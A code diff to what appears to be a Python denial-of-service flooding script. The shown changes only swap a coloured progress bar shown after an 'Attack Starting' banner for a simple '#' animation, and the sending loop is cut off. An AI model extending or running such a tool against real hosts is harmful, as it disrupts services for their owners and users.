@@ -4,6 +4,7 @@ import time
 import socket
 import random
 from termcolor import colored
+from colorama import Fore
 #This is where the magic starts using the power of python
 from datetime import datetime
 now = datetime.now()
@@ -40,17 +41,11 @@ dur = input("Time: ")
 timeout = time.time() + int(dur)
 sent = 0
 os.system("clear")
+par="#"
 os.system("figlet Attack Starting")
-print(colored("[                    ] 0% ",'blue'))
-time.sleep(4.9)
-print(colored("[=====               ] 25%", 'red'))
-time.sleep(4.9)
-print(colored("[==========          ] 50%",'magenta'))
-time.sleep(4.9)
-print(colored("[===============     ] 75%", 'yellow'))
-time.sleep(4.9)
-print(colored("[====================] 100%",'green'))
-time.sleep(2.9)
+for i in range(0,100):
+    print(Fore.RED+par,end="")
+    time.sleep(0.01)
 while True:
     try:
         if time.time() > timeout:
